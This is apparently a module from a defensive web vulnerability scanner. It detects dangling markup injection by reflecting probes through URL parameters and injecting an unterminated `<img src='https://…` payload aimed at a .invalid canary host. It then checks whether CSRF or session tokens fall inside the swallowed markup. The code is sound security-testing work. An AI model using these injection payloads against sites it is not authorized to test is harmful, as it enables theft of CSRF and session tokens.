// Dark Matter rule-based scanner — dangling markup injection detector (#52).
//
// Defensive purpose: detect attribute-reflection sinks where an
// unterminated tag can exfiltrate page secrets (CSRF tokens) via HTML
// tokenizer abuse — with ZERO script execution (CSP does not mitigate;
// ANTI-SUPPRESSION: a confirmed finding is never downgraded for CSP).
// Proof is by RESPONSE PARSING only — the canary host is a lab-controlled
// marker string; no real external server ever receives a hit.
//   D1. Reflection inventory: per-param canary, locate verbatim in HTML;
//       classify context (quoted attr = prime; text context = xss lane).
//   D2. Quote-escape oracle: canary with " ' <; verbatim in a quoted
//       attribute -> breakable; escaped -> INFO exit.
//   D3. Dangling oracle (the proof): inject `<img src='https://DM-CANARY/`
//       (no closing quote); CONFIRMED iff (1) verbatim in response,
//       (2) a secret-bearing token sits after the injection offset,
//       (3) tokenizer-span analysis shows the token inside the swallowed
//       blob (up to next matching quote or EOF).
//   D4. Amplifiers: CSRF/session token in blob = primary.
//
// Grading: MEDIUM = token in blob; LOW = structural swallow, no secret;
// INFO = escaped/encoded/not swallowed. Class key: danglingMarkup.

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function ev(request, response, impact) {
  return { request, response, impact_demo: impact, signalCorrelated: true };
}

async function getText(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA }, redirect: 'manual' });
    const text = await res.text().catch(() => '');
    return text.slice(0, 500000);
  } catch {
    return '';
  } finally {
    clearTimeout(t);
  }
}

const SECRET_RES = /(csrf|xsrf|authenticity)[-_]?token|sessionid|api[_-]?key|bearer\s+[a-z0-9._-]+/i;

// Find secret-bearing tokens in the page (for the D3 amplifier).
function findSecrets(html) {
  const out = [];
  const re = /(?:csrf|xsrf|authenticity)[-_]?token["']?\s*[:=]\s*["']?([A-Za-z0-9._-]{8,})/gi;
  let m;
  while ((m = re.exec(html))) out.push(m[1].slice(0, 40));
  const hid = /<input[^>]+name=["']([^"']*token[^"']*)["'][^>]+value=["']([^"']+)["']/gi;
  while ((m = hid.exec(html))) out.push(m[2].slice(0, 40));
  return [...new Set(out)].slice(0, 5);
}

// ---- D1/D2: reflection + quote-escape oracle -------------------------------------------------------
async function d1d2(url, params, opts, rid) {
  const sinks = [];
  const probe = `dmq${rid}"'><`;
  for (const p of (params || []).slice(0, 6)) {
    const u = new URL(url);
    u.searchParams.set(p, probe);
    const html = await getText(u.toString(), opts);
    if (!html || !html.includes(probe)) continue;
    // Context: inside a quoted attribute value?
    const idx = html.indexOf(probe);
    const before = html.slice(Math.max(0, idx - 300), idx);
    const attrM = /<[^<>]*=\s*(["'])[^"']*$/.exec(before);
    if (!attrM) continue; // text context — xss.js lane
    const delim = attrM[1];
    // D2: is the attribute's own delimiter escaped?
    const escaped = delim === '"' ? html.includes(`dmq${rid}&quot;`) || html.includes(`dmq${rid}&#34;`)
      : html.includes(`dmq${rid}&#39;`) || html.includes(`dmq${rid}&apos;`);
    const ltEncoded = html.includes(`dmq${rid}&lt;`);
    if (escaped || ltEncoded) continue; // hardened — INFO exit
    sinks.push({ param: p, delim });
  }
  return sinks;
}

// ---- D3: dangling oracle -------------------------------------------------------------------------------
async function d3Oracle(url, sinks, opts, rid) {
  const findings = [];
  const canaryHost = `dm-dangling-${rid}.invalid`;
  for (const sink of sinks.slice(0, 3)) {
    const payload = `<img src='https://${canaryHost}/`;
    const u = new URL(url);
    u.searchParams.set(sink.param, payload);
    const html = await getText(u.toString(), opts);
    if (!html || !html.includes(payload)) continue; // (1) verbatim required
    const injEnd = html.indexOf(payload) + payload.length;
    // (3) tokenizer span: first matching delimiter quote after injection.
    const delim = sink.delim;
    let spanEnd = html.indexOf(delim, injEnd);
    if (spanEnd === -1) spanEnd = html.length; // runs to EOF — strongest
    const blob = html.slice(injEnd, spanEnd);
    const secrets = findSecrets(html);
    const tokenInBlob = secrets.find((s) => blob.includes(s));
    // (2) secret-bearing token after the injection offset and inside blob.
    if (tokenInBlob) {
      findings.push({
        class: 'danglingMarkup',
        id: `dangling-${rand()}`,
        title: 'Dangling markup injection — page secret exfiltrated via tokenizer (MEDIUM)',
        severity: 'medium',
        url,
        parameter: sink.param,
        evidence: ev(
          `GET ${url}?${sink.param}=<img src='https://${canaryHost}/ (unterminated, response-parsed only)`,
          `Verbatim injection at offset ${injEnd}; swallowed span (${blob.length} bytes to ${spanEnd === html.length ? 'EOF' : 'next delimiter'}) contains secret token "${tokenInBlob.slice(0, 20)}...". CSP presence does NOT mitigate (no script involved) — anti-suppression applied.`,
          'Defensive finding: exfiltration primitive via dangling markup; escape attribute delimiters.'
        ),
      });
    } else if (blob.length > 50) {
      findings.push({
        class: 'danglingMarkup',
        id: `dangling-${rand()}`,
        title: 'Dangling markup injection — structural attribute swallow (LOW)',
        severity: 'low',
        url,
        parameter: sink.param,
        evidence: ev(
          `GET ${url}?${sink.param}=<img src='https://${canaryHost}/`,
          `Verbatim injection; ${blob.length}-byte span swallowed with no secret inside — real primitive, no secret impact demonstrated.`,
          'Defensive finding: attribute-escape hardening needed.'
        ),
      });
    }
    if (findings.length) break;
  }
  return findings;
}

export async function probeDanglingMarkup(url, params, opts = {}) {
  const findings = [];
  const rid = rand();
  const sinks = await d1d2(url, params, opts, rid);
  if (!sinks.length) return findings; // INFO exit
  findings.push(...(await d3Oracle(url, sinks, opts, rid)));
  return findings;
}

export const __danglingMeta = { phases: ['dangling-markup'], depth: ['quick', 'standard', 'deep'] };
